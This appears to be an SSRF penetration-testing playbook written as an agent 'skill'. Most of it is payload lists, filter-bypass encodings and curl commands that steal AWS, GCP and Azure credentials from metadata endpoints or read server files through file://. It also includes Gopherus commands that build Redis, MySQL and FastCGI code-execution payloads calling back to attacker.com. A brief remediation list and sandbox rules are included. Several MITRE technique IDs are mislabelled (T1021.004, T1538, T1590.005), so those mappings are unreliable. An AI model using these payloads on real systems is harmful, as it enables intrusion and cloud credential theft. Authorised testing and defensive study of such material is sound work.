# Server-Side Request Forgery (SSRF) — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application), T1105 (Ingress Tool Transfer)
**OWASP Mapping:** A10:2021 – Server-Side Request Forgery
**Severity:** Critical / High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: ssrf-v2
category: penetration-testing
author: HiveBreach
mitre_attack_id: T1190
owasp_mapping:
  - A10:2021-Server-Side Request Forgery
tags:
  - ssrf
  - server-side-request-forgery
  - web-application
  - cloud-metadata
  - T1190
  - T1105
  - T1590.005
environments:
  - web
  - api
  - cloud
  - microservice
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Entry Point Enumeration

Identify functionality that makes server-side HTTP requests:

| Functionality | Parameters | Risk |
|---|---|---|
| URL preview / link expansion | `url`, `link`, `target` | High |
| PDF/image generation | `url`, `src`, `source` | High |
| Webhook callbacks | `callback_url`, `webhook_url` | High |
| File import / upload from URL | `file_url`, `import_url` | High |
| Avatar/profile image fetch | `avatar_url`, `photo_url` | Medium |
| API proxy / gateway | `target`, `endpoint`, `url` | High |
| DNS resolution | `host`, `domain`, `hostname` | Medium |
| OAuth/OIDC callbacks | `redirect_uri`, `callback` | Medium |
| SAML/SSO metadata | `metadata_url` | High |
| Video/audio transcoding | `media_url` | Medium |

### 1.2 Probe Payloads (PayloadsAllTheThings + HackTricks)

**Basic SSRF probes:**
```
http://localhost
http://127.0.0.1
http://[::1]
http://localhost:80
http://127.0.0.1:8080
http://internal.service
http://169.254.169.254 (AWS Metadata)
http://metadata.google.internal (GCP Metadata)
http://169.254.169.254/latest/meta-data/ (AWS)
http://metadata.google.internal/computeMetadata/v1/ (GCP)
http://169.254.169.254/metadata/instance (Azure)
```

**Cloud metadata endpoints:**
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# DigitalOcean
http://169.254.169.254/metadata/v1.json

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
```

**Protocol handlers:**
```
file:///etc/passwd
file:///C:/Windows/win.ini
dict://localhost:11211/stat
dict://localhost:6379/info
gopher://127.0.0.1:25/_HELO%20localhost%250d%250aMAIL%20FROM%3A%3C%40%3E%250d%250aRCPT%20TO%3A%3Croot%40localhost%3E%250d%250aDATA%250d%250aSubject%3A%20test%250d%250a%250d%250aTest%250d%250a.%250d%250aQUIT%250d%250a
ldap://localhost:389/%3F%3F%3F%3F
ldaps://localhost:636/%3F%3F%3F%3F
tftp://127.0.0.1/TEST
```

**Bypass techniques:**
```
# DNS rebinding
http://localtest.me (resolves to 127.0.0.1)
http://127.0.0.1.nip.io
http://ssrf.example.com (attacker-controlled DNS)

# IP encoding
http://2130706433 (127.0.0.1 as decimal)
http://0x7F000001 (127.0.0.1 as hex)
http://017700000001 (127.0.0.1 as octal)
http://127.1 (shorthand)
http://127.0.1 (shorthand)

# URL parsing confusion
http://127.0.0.1:80@attacker.com/
http://attacker.com@127.0.0.1/
http://127.0.0.1:80#@attacker.com/
http://[::1]/
http://localhost:80@[::1]/

# Redirect chains
http://attacker.com/redirect -> 302 -> http://127.0.0.1/admin

# Subdomain takeover
http://vulnerable-sub.example.com (points to internal IP)
```

### 1.3 Response Analysis

| Indicator | Finding |
|---|---|
| Different response time for internal vs external | Port scanning via timing |
| Internal service banners (SSH, HTTP, Redis) | Service enumeration |
| Cloud metadata returned | Credential/token theft |
| File contents returned | Local file read via file:// |
| Error messages revealing internal topology | Information disclosure |
| Redirect to internal IP | Open redirect chain |

### 1.4 Automated Detection

**SSRFmap:**
```bash
ssrfmap -u "https://target.com/api/fetch" -p "url" -m GET
ssrfmap -u "https://target.com/api/fetch" -p "url" --level 3
```

**Gopherus (Gopher payload generation):**
```bash
gopherus --exploit redis --rhost 127.0.0.1 --rport 6379
gopherus --exploit mysql --rhost 127.0.0.1 --rport 3306 --user root --pass password
```

**Nuclei SSRF templates:**
```bash
nuclei -u https://target.com -t ~/nuclei-templates/vulnerabilities/ssrf/ -jsonl output.jsonl
```

**Manual Burp Suite (HackTricks):**
1. Intercept request with URL parameter
2. Send to Repeater
3. Test payloads from PayloadsAllTheThings SSRF list
4. Use Collaborator / Interactsh for blind SSRF detection
5. Check response timing differences

---

## 2. Confirmation

### 2.1 Port Scanning via SSRF

```bash
# Time-based port scan
for port in 22 80 443 3306 5432 6379 27017; do
  time curl -s -o /dev/null -w "%{http_code} %{time_total}" "https://target.com/fetch?url=http://127.0.0.1:$port"
done
```

### 2.2 Service Identification

```bash
# HTTP services
curl "https://target.com/fetch?url=http://127.0.0.1:8080"

# Redis
curl "https://target.com/fetch?url=dict://127.0.0.1:6379/info"

# Memcached
curl "https://target.com/fetch?url=dict://127.0.0.1:11211/stat"

# MySQL
curl "https://target.com/fetch?url=gopher://127.0.0.1:3306/_..." (use Gopherus)

# MongoDB
curl "https://target.com/fetch?url=mongodb://127.0.0.1:27017"
```

### 2.3 Cloud Metadata Confirmation

```bash
# AWS IAM role credentials
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# GCP service account token
curl -H "Metadata-Flavor: Google" "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure managed identity token
curl -H "Metadata: true" "https://target.com/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## 3. Exploitation

### 3.1 Cloud Credential Theft

**AWS:**
```bash
# Get role name
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Get credentials
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration
```

**GCP:**
```bash
# Get service account email
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# Get access token
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

**Azure:**
```bash
# Get token for Azure Resource Manager
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### 3.2 Internal Service Exploitation

**Redis RCE (via Gopher):**
```bash
# Generate payload
gopherus --exploit redis --rhost 127.0.0.1 --rport 6379 --lhost attacker.com --lport 4444

# Payload writes SSH key or cron job
```

**MySQL UDF Injection:**
```bash
# Generate payload
gopherus --exploit mysql --rhost 127.0.0.1 --rport 3306 --user root --pass password --lhost attacker.com --lport 4444
```

**FastCGI RCE (PHP-FPM):**
```bash
# If PHP-FPM exposed on 9000
# Use Gopherus fastcgi exploit
gopherus --exploit fastcgi --rhost 127.0.0.1 --rport 9000 --lhost attacker.com --lport 4444 --script /var/www/html/shell.php
```

### 3.3 File Read via file:// Protocol

```bash
# Linux
curl "https://target.com/fetch?url=file:///etc/passwd"
curl "https://target.com/fetch?url=file:///proc/self/environ"
curl "https://target.com/fetch?url=file:///proc/version"
curl "https://target.com/fetch?url=file:///app/config.py"

# Windows
curl "https://target.com/fetch?url=file:///C:/Windows/win.ini"
curl "https://target.com/fetch?url=file:///C:/inetpub/wwwroot/web.config"
```

### 3.4 Blind SSRF Exploitation

Use **Interactsh** / **Burp Collaborator** / **DNSBin**:

```bash
# Start interactsh server
interactsh-server

# Client
interactsh-client -server interactsh.example.com

# Inject payload
curl "https://target.com/fetch?url=http://<unique>.interactsh.example.com"

# Check for callback
```

### 3.5 SSRF to RCE Chains

| Internal Service | Exploit Path |
|---|---|
| Redis | Write SSH key / cron / lua script |
| MySQL | Load UDF / INTO OUTFILE |
| PostgreSQL | COPY TO PROGRAM / extensions |
| Memcached | Deserialization / command injection |
| Elasticsearch | Groovy scripting / native scripts |
| Jenkins | Script console / CLI |
| Jupyter | Notebook execution |
| Docker API | Container escape |
| Kubernetes API | Pod creation / exec |
| HashiCorp Vault | Token access |
| etcd | Cluster credentials |

---

## 4. Tool-Specific Guidance

### 4.1 SSRFmap
```bash
# Basic
ssrfmap -u "https://target.com/api/fetch" -p "url"

# With custom headers
ssrfmap -u "https://target.com/api/fetch" -p "url" -H "Authorization: Bearer token"

# Cloud metadata only
ssrfmap -u "https://target.com/api/fetch" -p "url" --cloud

# Aggressive
ssrfmap -u "https://target.com/api/fetch" -p "url" --level 5
```

### 4.2 Gopherus
```bash
# List exploits
gopherus --exploit list

# Redis
gopherus --exploit redis --rhost 127.0.0.1 --rport 6379

# MySQL
gopherus --exploit mysql --rhost 127.0.0.1 --rport 3306 --user root --pass pass

# FastCGI
gopherus --exploit fastcgi --rhost 127.0.0.1 --rport 9000 --script /var/www/html/shell.php
```

### 4.3 Interactsh (Blind SSRF)
```bash
# Server (run on VPS)
interactsh-server -domain interactsh.example.com

# Client
interactsh-client -server interactsh.example.com -v

# Test
curl "https://target.com/fetch?url=http://<unique-id>.interactsh.example.com"
```

### 4.4 Nuclei
```bash
nuclei -u https://target.com -t ~/nuclei-templates/vulnerabilities/ssrf/ -jsonl ssrf.jsonl
```

---

## 5. PoC Generation

### PoC Template

```markdown
## SSRF — [FINDING_ID]

**URL:** https://target.com/api/fetch
**Parameter:** url
**Type:** Direct / Blind / Semi-blind
**Impact:** Cloud metadata access / Internal port scan / File read / RCE

### Payload
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

### Evidence
- [Response showing AWS credentials]
- [Internal service banner]
- [File contents]
- [Interactsh callback screenshot]

### Impact
- Cloud credentials: YES (AWS/GCP/Azure)
- Internal services enumerated: 80, 443, 3306, 6379, 27017
- Local files read: /etc/passwd, /app/config.py
- RCE achieved: YES/NO (via Redis/MySQL/FastCGI)

### Remediation
- Allow-list allowed URLs/domains
- Block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, 127.0.0.0/8, ::1)
- Block cloud metadata IPs (169.254.169.254, metadata.google.internal)
- Enforce URL schema (http/https only)
- Disable redirects or validate redirect targets
- Use dedicated egress proxy with strict rules
- Implement request timeout

### Reproduction Steps
1. Send GET request to `https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/`
2. Observe response contains instance metadata
3. Request credentials: `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`
4. Use credentials to access AWS resources
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Reproduction in isolated environment with mock internal services
- [ ] Cloud metadata endpoints mocked
- [ ] No actual cloud credentials stolen
- [ ] No internal services actually compromised
- [ ] Impact scope documented

### Prohibited Actions
- Accessing real cloud metadata in production
- Attacking real internal services
- Stealing real credentials
- Performing actual RCE

---

## 7. Bypass Techniques Reference

| Protection | Bypass |
|---|---|
| Block `localhost` | `127.0.0.1`, `[::1]`, `0x7F000001`, `localtest.me` |
| Block `127.0.0.1` | `127.1`, `127.0.1`, `2130706433`, `017700000001` |
| Block private IPs | DNS rebinding, IPv6, CIDR bypass |
| Block cloud metadata | Redirect chain, DNS rebinding |
| Allow-list domains | Subdomain takeover, wildcard bypass |
| Validate URL schema | `file://`, `dict://`, `gopher://`, `ldap://` |
| Timeout | Slow response, chunked encoding |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial access |
| T1105 | Ingress Tool Transfer | Fetch payloads |
| T1590.005 | Active Scanning: Vulnerability Scanning | Internal port scan |
| T1552.005 | Unsecured Credentials: Cloud Instance Metadata API | Credential theft |
| T1021.004 | Pass the Hash | Lateral movement |
| T1611 | Escape to Host | Container escape via Docker API |
| T1538 | Steal Web Session Cookie | Via internal admin panel |

---

## 9. References

- PayloadsAllTheThings SSRF: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- HackTricks SSRF: https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- SSRFmap: https://github.com/swisskyrepo/SSRFmap
- Gopherus: https://github.com/tarunkant/Gopherus
- Interactsh: https://github.com/projectdiscovery/interactsh
- Orange Tsai SSRF: http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*